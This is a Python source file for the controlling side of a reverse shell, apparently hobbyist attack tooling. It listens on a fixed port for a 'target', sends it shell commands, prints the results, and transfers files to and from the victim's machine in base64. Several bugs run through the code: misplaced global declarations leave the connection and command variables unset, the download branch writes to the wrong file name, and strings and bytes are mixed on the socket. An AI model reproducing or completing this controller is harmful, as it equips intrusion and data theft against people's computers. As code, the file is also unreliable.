import socket
import json
import base64

class Server:
    global s
    global ip
    global target
    global command

    def reliable_send(self, data):
        json_data = json.dumps(data)
        target.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + target.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def shell(self):
        while True:
            # creation of simple command
            command = input("* Shell#-%s: " % str(ip))
            # send the command
            self.reliable_send(command)
            if command == "q":
                break
            elif command[:2] == "cd" and len(command) > 1:
                continue
            elif command[:8] == "download":
                with open(command[:9], "wb") as file:
                    result = self.reliable_receive()
                    file.write(base64.b64decode(result))
            elif command[:6] == "upload":
                try:
                    with open(command[7:],"rb") as fin:
                        self.reliable_send(base64.b64encode(fin.read()))
                except:
                    failed = "Failed to upload"
                    self.reliable_send(base64.b64encode(failed))
            else:
                answer = self.reliable_receive()
                # print the answer from the reverse shell
                print(answer)

    def server(self):
        # reread the documentation of socket library
        # declaration of the socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # bind the port and the host
        # the port number doesn't matter as long there is nothing on it
        # find the right ip address before starting the server
        ipaddress = ""

        s.bind((ipaddress, 54321))

        # the socket will listen to five connection
        s.listen(5)

        print("Listening for incoming connection")

        target, ip = s.accept()

        print("Target Connected !")

    def end_connection(self):
        s.close()

    def main(self):
        self.server()
        self.shell()
        if command == "q":
            self.end_connection()
